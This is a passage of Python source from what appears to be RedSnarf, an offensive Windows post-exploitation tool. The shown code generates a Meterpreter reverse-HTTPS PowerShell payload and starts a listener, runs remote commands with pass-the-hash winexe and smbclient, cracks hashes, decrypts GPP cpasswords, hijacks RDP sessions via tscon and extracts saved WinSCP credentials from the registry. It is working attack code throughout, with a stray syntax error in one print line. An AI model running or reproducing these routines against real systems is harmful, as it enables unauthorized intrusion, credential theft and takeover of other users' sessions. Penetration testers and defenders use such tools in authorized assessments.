			#Read in IP addresses
			fo=open(usr_response,"r")
			line = fo.readlines()
			fo.close()

			#Add lines to array
			for newline in line:
				newline=newline.strip('\n')
				lstliveips.append (newline);

			#Shuffle array
			shuffle(lstliveips)

			#Get number of lines in array
			no_of_lines=len(lstliveips)
			print(colored("[+]"+str(no_of_lines)+" IP addresse(s) were detected...",'yellow'))

			#Check number of lines less than 10
			if no_of_lines<10:
				#If less print error message and exit
				print(colored("[-]Can't calculate ten percent as less than 10 IP addresses are available",'red'))
				sys.exit()

			#Calculate 10 percent
			ten_percent=no_of_lines/10

			#Get filename to write 10 percent to
			ten_sample_response = raw_input("Please enter filename for 10 percent sample: ")
			if ten_sample_response!='':
				#Write top 10% of lines to file
				fout=open(ten_sample_response,'w')
				for x in xrange(0,ten_percent):
					fout.write(lstliveips[x]+"\n")
				#Print complete status
				print(colored("[+]"+str(ten_percent)+" (10 Percent) written to file "+ten_sample_response,'yellow'))
				fout.close()

			sys.exit()

	sys.exit()

#Converts IPV4 CIDR notation
if cidr!='':
	print(colored("[+]Converting from CIDR...",'yellow'))
	ip = IPNetwork(cidr)
	print("IP Address "+str(ip.ip))
	print("Network Mask "+str(ip.netmask))
	print("Broadcast Address "+str(ip.broadcast))
	print("Network Address "+str(ip.network))
	print("Total IP's " +str(ip.size))
	print("Useable IP's " +str(ip.size-2))
	sys.exit()

#Call routine to send hashes to JtR
if sendtojohn!='':
	print(colored("[+]Sending Hashes from "+sendtojohn+" to JtR:",'yellow'))
	quickjtr(sendtojohn)
	sys.exit()

#Function sends SPN file to Jtr Jumbo
if sendspntojohn!='':
	#Check to see if Jtr Jumbo is installed
	if jtr_jumbo_installed()!=None:
		if os.path.isfile(sendspntojohn):
			print(colored("[+]SPN's to Jtr Jumbo",'green'))
			print(colored("[+]Sending SPN(s) in "+sendspntojohn+" to Jtr Jumbo",'yellow'))
			quickjtrjumbo(sendspntojohn,jtr_jumbo_installed())
		else:
			print(colored("[+]SPN's to Jtr Jumbo",'green'))
			print(colored("[-] "+sendspntojohn +" not found",'red'))
	else:
		print(colored("[+]Jtr Jumbo not found..",'red'))
		sys.exit()

	sys.exit()

#Code takes a hash file which has previously been seen by Jtr, cuts out the cracked passwords, gets rid of any blank lines, gets rid of the last line, outputs to a tmp file
#in the tmp directory. Runs pipal against the tmp file and then pipes out the pipal data to file.
if john_to_pipal!='':
	print(colored("[+]Sending Cracked passwords from "+john_to_pipal+" to Pipal:",'yellow'))
	proc = subprocess.Popen("john --format=nt "+john_to_pipal+" --show  | cut --delimiter=':' -f2 | sed '/^$/d' | grep -Ev 'password hashes cracked,' > /tmp/tmp.txt | pipal /tmp/tmp.txt > /tmp/pipalstats.txt" , stdout=subprocess.PIPE,shell=True).wait()

	if os.stat('/tmp/pipalstats.txt').st_size >0:
		print(colored("[+]Pipal Stats have been output to /tmp/pipalstats.txt:",'green'))

	sys.exit()

#Call routine to write out LAT file
if lat in yesanswers:
	WriteLAT()
	sys.exit()

#Call routine to write out FAT file
if fat in yesanswers:
	WriteFAT()
	sys.exit()

#Decrypt a passed cpassword
if c_password!='':
	try:
		banner()
		print(colored("[+]Attempting to decrypt cpassword:",'yellow'))
		gppdecrypt(c_password)
		sys.exit()
	except:
		sys.exit()

#Generates Powershell Meterpreter Reverse HTTPS Code and starts a Meterpreter Listener
if meterpreter_revhttps in yesanswers:
	try:
		print(colored("[+]Generating Meterpreter Reverse HTTPS Powershell Code & Listener:\n",'green'))

		print(colored("[+] IP Address of eth0 is "+get_ip_address('eth0'),'yellow'))

		if get_ip_address('eth1')!="":
			print(colored("[+] IP Address of eth1 is "+get_ip_address('eth1'),'yellow'))

		if get_ip_address('tap0')!="":
			print(colored("[+] IP Address of tap0 is "+get_ip_address('tap0'),'yellow'))

		my_ip = raw_input("\nPlease enter IP to listen on: (q to quit): ")
		if my_ip=="q":
			sys.exit()

		usr_port = raw_input("\nPlease enter port to listen on: (q to quit): ")
		if usr_port=="q":
			sys.exit()

		if usr_port !="":
			proc = subprocess.Popen("msfvenom -p windows/meterpreter/reverse_https -f psh -a x86 LHOST="+my_ip+" LPORT="+usr_port+" -o /tmp/mt.ps1 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()
			#print(proc.communicate()[0])

			if os.path.isfile('/tmp/mt.ps1'):
				print(colored("[+]Powershell code successfully generated and located in /tmp/mt.ps1",'yellow'))
			else:
				print(colored("[-]Somthing went wrong generating reverse https meterpreter",'red'))
				sys.exit()

		usr_response = raw_input("\nAre you ready to start a listener: ")

		if usr_response in yesanswers:

			fout=open('/tmp/revshell.rb','w')
			fout.write('use exploit/multi/handler \n')
			fout.write('set payload windows/meterpreter/reverse_https\n')
			fout.write('set lhost '+my_ip+'\n')
			fout.write('set lport '+usr_port+'\n')
			fout.write('exploit -j\n')
			fout.close()

			os.system("msfconsole -q -r /tmp/revshell.rb")

		sys.exit()

	except OSError:
		print(colored("[-]Something went wrong Generating Meterpreter Reverse HTTPS Code & Listener",'red'))
		logging.error("[-]Something went wrong Generating Meterpreter Reverse HTTPS Code & Listener")

	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Parse the ip to see if we are dealing with a single ip, a range or a file with multiple ips
targets=[]
remotetargets = args.host

if remotetargets==None:
	print(colored('[-]You have not entered a target!, Try --help for a list of parameters','red'))
	sys.exit()

if remotetargets[0:5]=='file=':

	if not os.path.isfile(remotetargets[5:len(remotetargets)]):
		print(colored("[-]No "+remotetargets[5:len(remotetargets)],'red'))
		exit(1)
	else:
		fo=open(remotetargets[5:len(remotetargets)],"rw+")
		line = fo.readlines()
		fo.close()

		for newline in line:
			newline=newline.strip('\n')
			targets.append (newline);

elif remotetargets[0:3]=='ip=':

	targets.append (remotetargets[3:len(remotetargets)]);

elif remotetargets[0:6]=='range=':

	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
		targets.append (remotetarget);

elif remotetargets[0:8]=='nmapxml=':
	if not os.path.isfile(remotetargets[8:len(remotetargets)]):
		print(colored("[-]File not found "+remotetargets[8:len(remotetargets)],'red'))
		exit(1)

	nmap_report = NmapParser.parse_fromfile(remotetargets[8:len(remotetargets)])

	for host in nmap_report.hosts:
		if host.is_up():
			host_ports =  host.get_open_ports()
			for port in host_ports:
				if 445 in port:
					targets.append(host.address)

	if len(targets)==0:
		print(colored("[-]No suitable targets found in xml file",'red'))
		sys.exit()

	print(colored("[+]Parsed Nmap output and found "+str(len(targets))+" target(s) in xml file\n",'yellow'))

#Function runs windows Base Line Analyser on a remote machine to get patch status.
if windows_updates != 'n':
	if windows_updates in yesanswers:

		#Parse XML for Missing Patches
		privesc=["MS17-010","MS16-135","MS16-032","MS16-016","MS15-051","MS14-058","MS14-040","MS14-002","MS13-005","MS10-092","MS10-015","MS14-002","MS15-061","MS11-080","MS11-062","MS15-076","MS16-075","MS15-010","MS11-046","MS10-015","MS10-092","MS13-053","MS13-081","MS14-058","MS15-051","MS15-078","MS16-016","MS16-032"];
		missingpatches = []
		dirty = "false"
		output="./wupdate/wsusscn2.cab"

		if not os.path.exists(output):
			print(colored("\n[+]Checking Dependancies",'yellow'))
			print(colored("[-]wsusscn2.cab is missing...",'red'))
			print(colored("[+]Downloading wsusscn2.cab",'green'))
			file_url = 'http://go.microsoft.com/fwlink/?LinkId=76054'
			file_name = wget.download(file_url, out="./wupdate/wsusscn2.cab")

		if os.path.exists(output):
			print(colored("\n[+]Checking Dependancies",'yellow'))

			print(colored("[+]The file stamp on wsusscn2.cab is ",'green')+colored("created: %s" % time.ctime(os.path.getctime(output)),'white'))
			print(colored("[+]For best results wsusscn2.cab needs to be as up to date as possible\n",'yellow'))

			response=raw_input("Do you want to download a new copy now? (y/n) " )

			if response in yesanswers:
				os.unlink("./wupdate/wsusscn2.cab")
				print(colored("[+]Downloading wsusscn2.cab",'green'))
				file_url = 'http://go.microsoft.com/fwlink/?LinkId=76054'
				file_name = wget.download(file_url, out="./wupdate/wsusscn2.cab")

		if not os.path.exists(outputpath+targets[0]):
			os.makedirs(outputpath+targets[0])
			print(colored("\n[+]Creating directory for host: "+targets[0],'green'))

		print(colored("\n[+]Uploading Files",'yellow'))
		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"/wupdate/"+"; put mbsacli.exe\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()
		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"/wupdate/"+"; put wusscan.dll\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()
		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"/wupdate/"+"; put wsusscn2.cab\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()

		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \'cmd.exe /C dir c:\\ \' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
		result=proc.communicate()[0]
		if "mbsacli.exe" not in result or "wusscan.dll" not in result or "wsusscn2.cab" not in result:
			print(colored("[-]Something has gone wrong uploading files..\n",'red'))
			sys.exit()

		print(colored("[+]Checking Updates, be patient this can take a while....\n",'yellow'))

		print(colored("[+]Good time to grab a Coffee, \n",'green'))
		print(colored("	   {",'red'))
		print(colored("        {   }",'red')_
		print(colored("       }_{ __{",'red'))
		print(colored("    .-{   }   }-.",'red'))
		print(colored("   (   }     {   )",'red'))
		print(colored("   |`-.._____..-'|",'red'))
		print(colored("   |             ;--.",'red'))
		print(colored("   |            (__  \\",'red'))
		print(colored("   |     NCC     | )  )",'red'))
		print(colored("   |    Group    |/  /",'red'))
		print(colored("   |             /  /    ",'red'))
		print(colored("   |    2017    (  /",'red'))
		print(colored("   \             y'",'red'))
		print(colored("    `-.._____..-'\n\n",'red'))

		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"cmd.exe /C c:\\mbsacli.exe /xmlout /catalog c:\\wsusscn2.cab /nvc > c:\\results.xml \" 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()

		print(colored("[+]Getting Results",'yellow'))
		proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; get results.xml"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()

		if os.path.exists(outputpath+targets[0]+"/results.xml"):
			print(colored("[+]Results saved to ",'yellow')+colored(outputpath+targets[0]+"/results.xml",'green'))
		else:
			print(colored("[+]Failed to get updates...",'red'))

		print(colored("[+]Cleaning Up\n",'yellow'))
		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\results.xml c:\\wsusscn2.cab.dat c:\\wsusscn2.cab c:\\mbsacli.exe c:\\wusscan.dll\" 2>/dev/null", stdout=subprocess.PIPE,shell=True).wait()

		#Parse the xml
		if os.path.exists(outputpath+targets[0]+"/results.xml"):
			tree = ET.parse(outputpath+targets[0]+"/results.xml")
			root = tree.getroot()

			for child in root:
				if child.tag == "Check":
					for step_child in child:
						if step_child.tag == "Detail":
							for step_step_child in step_child:
								if step_step_child.tag == "UpdateData":
									if step_step_child.get('IsInstalled')=="false":
										for step_step_step_child in step_step_child:
											if step_step_step_child.tag== "Title":
												missingpatches.append(step_step_step_child.text+","+" BulletinID "+step_step_child.get('BulletinID') + ", KBID " + step_step_child.get('KBID')+ ", Severity " + step_step_child.get('Severity'))

			missingpatches=list(set(missingpatches))

			if len(missingpatches)>0:
				print(colored("[+]Found some missing patches",'yellow'))
				print(colored("[+]Any displayed below in red are priv esc vulnerabilities\n",'green'))

			for patches in missingpatches:

				for pesc in privesc:
					if str(pesc) in patches:
						dirty = "true"

				if dirty == "false":
					print(patches)
				else:
					print(colored(patches,'red'))

				dirty = "false"

			print("\n\n")

		sys.exit()

	if windows_updates=="update":

		output="./wupdate/wsusscn2.cab"

		if not os.path.exists(output):
			print(colored("\n[+]Microsoft wsusscn2.cab Updater",'yellow'))
			print(colored("[-]wsusscn2.cab is missing...",'red'))
			print(colored("[+]Downloading wsusscn2.cab",'green'))
			file_url = 'http://go.microsoft.com/fwlink/?LinkId=76054'
			file_name = wget.download(file_url, out="./wupdate/wsusscn2.cab")
			print("\n")
			sys.exit()

		if os.path.exists(output):
			print(colored("\n[+]Microsoft wsusscn2.cab Updater",'yellow'))
			print(colored("\n[+]Checking Dependancies",'yellow'))

			print(colored("[+]The file stamp on wsusscn2.cab is ",'green')+colored("created: %s" % time.ctime(os.path.getctime(output)),'white'))
			print(colored("[+]For best results wsusscn2.cab needs to be as up to date as possible\n",'yellow'))

			response=raw_input("Do you want to download a new copy now? (y/n) " )

			if response in yesanswers:
				os.unlink("./wupdate/wsusscn2.cab")

				print(colored("[+]Downloading wsusscn2.cab",'green'))
				file_url = 'http://go.microsoft.com/fwlink/?LinkId=76054'
				file_name = wget.download(file_url, out="./wupdate/wsusscn2.cab")
				print("\n")

		sys.exit()

	sys.exit()

#Function looks for accounts which have delegated privs
if delegated_privs in yesanswers:
	#Setup
	dirty = "False"
	username=[]


	fullnames=[]
	oulist=[]
	namelist=[]

	print(colored("[+]Getting OU List & Checking for possible Delegated Privileges",'green'))

	#Get all OU's available in domain
	proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C dsquery ou domainroot' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
	tmpoulist = proc.communicate()[0]

	#Cycle ou's and get privs
	for ou in tmpoulist.splitlines():
		print(ou[1:(len(ou)-1)])

		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C dsacls "+ou+"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
		ouprivs = proc.communicate()[0]

		#Flag things we're interested in here
		for line in ouprivs.splitlines():

			if "Reset Password" in line:
				print(colored(line,'yellow'))
				dirty="True"
				#print(line.split(" ")[1])
				username.append(line.split(" ")[1]+":"+ou[1:(len(ou)-1)])

			if "FULL CONTROL" in line and "Enterprise Admins" not in line and "NT AUTHORITY\SYSTEM" not in line and "Domain Admins" not in line:
				print(colored(line,'yellow'))
				dirty="True"
				#print(line.split(" ")[1])
				#print(line.split(" ")[1]+":"+ou[1:(len(ou)-1)])
				username.append(line.split(" ")[1]+":"+ou[1:(len(ou)-1)])

			if "SPECIAL ACCESS for Users" in line and "Enterprise Admins" not in line and "NT AUTHORITY\SYSTEM" not in line and "Domain Admins" not in line and "Allow BUILTIN" not in line:
				print(colored(line,'yellow'))
				dirty="True"
				#print(line.split(" ")[1])
				username.append(line.split(" ")[1]+":"+ou[1:(len(ou)-1)])

	if dirty=="True":
		print(colored("\n[+]Users with interesting privileges...",'yellow'))
		username=list(set(username))
		for name in username:
			#print(name)
			uname= (name.split(":")[0])
			#print(uname)
			uname= (uname.split("\\")[1])
			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C net user \""+uname+"\" /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			fullname = proc.communicate()[0]

			for info in fullname.splitlines():
				if "Full Name" in info:
					if len(info)>29:
						userfullname=info[29:len(info)]
						fullnames.append(userfullname)
						oulist.append((name.split(":")[1]))
						namelist.append(uname)
					else:
						fullnames.append(uname)
						oulist.append((name.split(":")[1]))
						namelist.append(uname)

		for x in xrange(0,len(fullnames)):
			print("["+str(x)+"]"+fullnames[x]+" "+oulist[x])

	#If dirty flag is true we potentially have users with delegated privs we can investigate
	if dirty=="True":
		print(colored("\n[+]Looks like there are some delegated privileges...",'yellow'))

		print(colored("[1]View all privileges for a single user?",'white'))
		print(colored("[2]Search all users for Reset Password and Send As privilege?",'white'))
		print(colored("[3]Exit\n",'white'))

		response=raw_input("Enter selection? (1,2,3) ")

		if response=="3":
			print(colored("[-]Fair Enough...",'yellow'))
			sys.exit()
		elif response =="1":
			response1=raw_input("Please enter number in [] for user - ")
			#response2=raw_input("Please enter their OU - ")

			print(colored("\n[+]Gathering details for ",'green')+colored(fullnames[int(response1)],'yellow'))

			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C dsacls \""+"CN="+fullnames[int(response1)]+","+oulist[int(response1)]+"\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			userprivs = proc.communicate()[0]
			for privs in userprivs.splitlines():
				if "Reset Password" in privs:
					print(colored(privs,'red'))
				elif "Send As" in privs:
					print(colored(privs,'red'))
				#elif namelist[int(response1)] in privs:
				#	print(colored(privs,'red'))
				else:
					print(privs)

			sys.exit()

		elif response =="2":
			for x in xrange(0,len(fullnames)):

				print(colored("\n[+]Gathering details for ",'green')+colored(fullnames[int(x)],'yellow'))
				print(colored("[+]Users OU ",'green')+colored(oulist[int(x)],'yellow'))

				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C dsacls \""+"CN="+fullnames[int(x)]+","+oulist[int(x)]+"\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				userprivs = proc.communicate()[0]
				for privs in userprivs.splitlines():
					if "Send As" in privs:
						print("[+]"+fullnames[int(x)]+" "+colored(privs,'red'))
					if "Reset Password" in privs:
						print("[+]"+fullnames[int(x)]+" "+colored(privs,'red'))
					if namelist[int(x)] in privs:
						print("[+]"+fullnames[int(x)]+" "+colored(privs,'red'))

	if dirty=="False":
		print(colored("\n[+]No users found with interesting privileges...",'yellow'))

	sys.exit()

#Routine starts Custom Powershell Script
if custom_powershell in yesanswers or custom_powershell=="AV":
	print(colored("[+]Run Custom Powershell Script",'green'))

	print(colored("[+]Scripts in RedSnarf folder",'blue'))
	os.system("ls *.ps1")

	shellscript = raw_input("\nPlease enter the Powershell Script to run: ")
	InvokeFunction = raw_input("Please enter the function to Invoke: ")
	FunctionCommand = raw_input("Please enter the command to run: ")

	cps(shellscript,custom_powershell,InvokeFunction,FunctionCommand,targets[0],"false")

	sys.exit()

#Function enables connecting to remote RDP sessions without authenticating as the user who the session belongs to.
if rdp_connect in yesanswers or "ID" in rdp_connect:

	rdp_sessions = []

	#Check to see if NLA is turned on
	proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-TCP\" /v \"UserAuthentication\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
	NLAStatus = proc.communicate()[0]

	#Error if NLA is turned on
	if "0x1" in NLAStatus:
		print(colored("\n[-]We've detected that NLA is turned on (try -rN d to turn off), this may not work.",'yellow'))
		print(colored("[-]xfreerdp is a good alternative to rdesktop for NLA issues....",'yellow'))
		usr_response = raw_input("\nPlease any key to continue or q to exit: ")
		if usr_response.upper() =="Q":
			sys.exit()

	#Check to see port 3389 is open
	scanv = subprocess.Popen(["nmap", "-sS", "-p3389","--open", targets[0]], stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
	if not "open" in scanv:
		print(colored("\n[-]We can't detect port 3389 as open, this might not work!..",'yellow'))
		print(colored("\n[-]Try -rR e to enable RDP service and open port",'yellow'))
		usr_response = raw_input("\nPlease any key to continue or q to exit: ")
		if usr_response.upper() =="Q":
			sys.exit()

	if "ID" in rdp_connect:
		if len(targets)==1:
			try:
				print(colored("[+]RDP Session Hijack:",'green'))
				print(colored("[+]Note - RDP Session Hijack can be run with -uRP ID or -uRP y:",'yellow'))
				print(colored("[+]-uRP y is more stable:\n",'yellow'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				sessions = proc.communicate()[0]

				#Check to see if sessions are available
				if len(sessions)==0:
					print(colored("[-]No sessions were detected on the remote host",'red'))
					sys.exit()

				print(sessions)

				lines=sessions.splitlines()

				for line in lines:
					if "rdp" in line:
						rdpdest=line.find('rdp')
						rdp_sessions.append(line[int(rdpdest):35].rstrip())

				usr_response = raw_input("\nPlease enter the ID of the session you wish to interact with : ")
				if usr_response !="":

					if len(rdp_sessions)==0:
						proc = subprocess.Popen("rdesktop "+targets[0]+" 2>/dev/null", shell=True)
						os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+"rdp-tcp#0"+"\" 2>/dev/null")
					else:
						proc = subprocess.Popen("rdesktop "+targets[0]+" 2>/dev/null", shell=True)
						os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+"rdp-tcp#"+str((len(rdp_sessions)))+"\" 2>/dev/null")

				sys.exit(1)
			except OSError:
				print(colored("[-]Something went wrong RDP Priv Esc Connect",'red'))
				logging.error("[-]Something went wrong RDP Priv Esc Connect")
	else:
		if len(targets)==1:
			try:
				print(colored("[+]RDP Session Hijack:",'green'))
				print(colored("[+]Note - RDP Session Hijack can be run with -uRP ID or -uRP y:\n",'yellow'))
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				sessions = proc.communicate()[0]

				#Check to see if sessions are available
				if len(sessions)==0:
					print(colored("[-]No sessions were detected on the remote host",'red'))
					sys.exit()

				print(sessions)

				lines=sessions.splitlines()

				for line in lines:
					if "rdp" in line:
						rdpdest=line.find('rdp')
						rdp_sessions.append(line[int(rdpdest):35].rstrip())

				if len(rdp_sessions)==0:
					print(colored("[-]No sessions were detected.",'red'))
					answer = raw_input("\nWould you like to enter a destination manually? (y/n): ")
					if answer in yesanswers:
						sess_dest = raw_input("\nPlease enter a destination (if unsure enter rdp-tcp#0): ")
						usr_response = raw_input("\nPlease enter the ID of the session you wish to interact with : ")
					else:
						sys.exit()
				elif len(rdp_sessions)!=0:
					print(colored("[+]Session Destination",'yellow'))
					for x in xrange(0,len(rdp_sessions)):
						print(colored("["+str(x)+"]"+rdp_sessions[x],'green'))
					sess_dest = raw_input("\nPlease enter destination number or manually enter full destination e.g. rdp-tcp#0: ")

					usr_response = raw_input("\nPlease enter the ID of the session you wish to interact with : ")

				if "rdp-tcp#" in sess_dest and usr_response !="":
					proc = subprocess.Popen("rdesktop "+targets[0]+" 2>/dev/null", shell=True)
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+sess_dest+"\" 2>/dev/null")
					sys.exit()

				if usr_response !="":
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"tscon "+usr_response+" /dest:"+rdp_sessions[int(sess_dest)]+"\" 2>/dev/null")
					sys.exit()

			except OSError:
				print(colored("[-]Something went wrong RDP Priv Esc Connect",'red'))
				logging.error("[-]Something went wrong RDP Priv Esc Connect")

#Routine locks a remote users desktop
if lockdesktop in yesanswers:
	if len(targets)==1:
		try:
			print(colored("[+]Retrieving Desktops:\n",'green'))

			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C query user \" 2>/dev/null")

			usr_response = raw_input("\nPlease enter the username whose desktop you wish to lock : ")
			if usr_response !="":

				print(colored("[+]Locking Desktop...",'yellow'))
				fout=open('/tmp/lockdesktop.bat','w')
				fout.write('SchTasks /Create /SC DAILY /RU '+usr_response+' /TN "RedSnarf_LockDesktop" /TR "c:\\windows\\System32\\rundll32.exe user32.dll,LockWorkStation" /ST 23:36 /f\n')
				fout.write('SchTasks /run /TN "RedSnarf_LockDesktop" \n')
				fout.close()

				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put lockdesktop.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\lockdesktop.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]Tidying Up...",'yellow'))
				fout=open('/tmp/lockdesktop_cleanup.bat','w')
				fout.write('SchTasks /delete /TN "RedSnarf_LockDesktop" /f\n')
				fout.write('del c:\\lockdesktop.bat"\n')
				fout.close()

				proc = subprocess.Popen("/usr/bin/pth-smbclient //"+targets[0]+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put lockdesktop_cleanup.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+targets[0]+" \"c:\\lockdesktop_cleanup.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])
				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe /C del c:\\lockdesktop_cleanup.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				print(proc.communicate()[0])

				print(colored("[+]User desktop "+usr_response+" should be locked...",'green'))

			sys.exit()

		except OSError:
			print(colored("[-]Something went wrong locking the desktop",'red'))
			logging.error("[-]Something went wrong locking the desktop")

	else:
		print(colored('\n[-]It is only possible to use this technique on a single target and not a range','red'))
		sys.exit()

#Routine finds and decrypts and WinSCP passwords
if win_scp!='n':
	num_sessions = []
	if len(targets)==1:
		try:
			#First Check to see whether a master password is being used
			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Configuration\Security\" /v \"UseMasterPassword\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			UseMasterPassword = proc.communicate()[0]
			if "0x1" in UseMasterPassword:
				print(colored("[+]WinSCP Master Password Detection:",'green'))
				print(colored("[+]A Master Password is in use, unable to continue:",'yellow'))
				sys.exit()

			print(colored("[+]Getting WinSCP Sessions:",'green'))
			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\" ' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			scp_sessions = proc.communicate()[0]

			if "The system was unable to find the specified registry key or value." in scp_sessions or len(scp_sessions)==0:
				print(colored("[-]No sessions found...",'red'))
				sys.exit()

			k=scp_sessions.splitlines()

			for session in k:
				if len(session)>0:
					num_sessions.append(session[60:])

			if len(num_sessions)==0:
				print(colored("[-]No sessions were found:",'red'))
				sys.exit()

			print(colored("[+]The following WinSCP Sessions were found:",'green'))

			if len(num_sessions)!=0:
				for session in xrange(0,len(num_sessions)):
					print(colored("["+str(session)+"]"+num_sessions[session],'yellow'))

			response = raw_input("Enter session number you would like to recover details for (q to quit):")
			if response !="":

				if response=="q":
					sys.exit()

				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"HostName\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				scp_host = proc.communicate()[0]

				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"Username\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				scp_username = proc.communicate()[0]

				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C reg.exe query \"HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\\"+num_sessions[int(response)]+"\""" /v \"Password\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
				scp_password = proc.communicate()[0]

				if len(scp_host) and len(scp_username) and len(scp_password)==4:
					print(colored("[-]No details were found that could be used:",'red'))
					sys.exit()

